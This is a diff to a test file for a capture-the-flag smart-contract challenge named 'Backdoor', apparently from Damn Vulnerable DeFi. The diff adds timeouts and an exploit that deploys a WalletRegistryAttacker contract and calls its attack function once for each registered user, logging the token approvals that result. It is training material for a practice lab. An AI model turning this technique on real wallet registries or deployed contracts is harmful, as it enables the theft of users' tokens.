@@ -7,6 +7,7 @@ describe('[Challenge] Backdoor', function () {
     const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');
 
     before(async function () {
+        this.timeout(20000);
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
         users = [alice.address, bob.address, charlie.address, david.address]
@@ -36,7 +37,28 @@ describe('[Challenge] Backdoor', function () {
     });
 
     it('Exploit', async function () {
+        this.timeout(20000);
+        this.token.provider.pollingInterval = 1;
         /** CODE YOUR EXPLOIT HERE */
+        this.attackerContract  = await (await ethers.getContractFactory('WalletRegistryAttacker', attacker)).deploy(
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.masterCopy.address,
+            this.token.address
+        );
+
+
+
+        for (let i = 0; i < users.length; i++) {
+            const tx = await this.attackerContract.connect(attacker).attack(users[i], this.token.address, attacker.address);
+            await this.token.on("Approval", async (o, a, s) => {
+                console.log(`allowance: ${o}`)
+            });
+            const receipt = await tx.wait();
+            for (const event of receipt.events) {
+                console.log(JSON.stringify(event))
+            }
+        }
     });
 
     after(async function () {
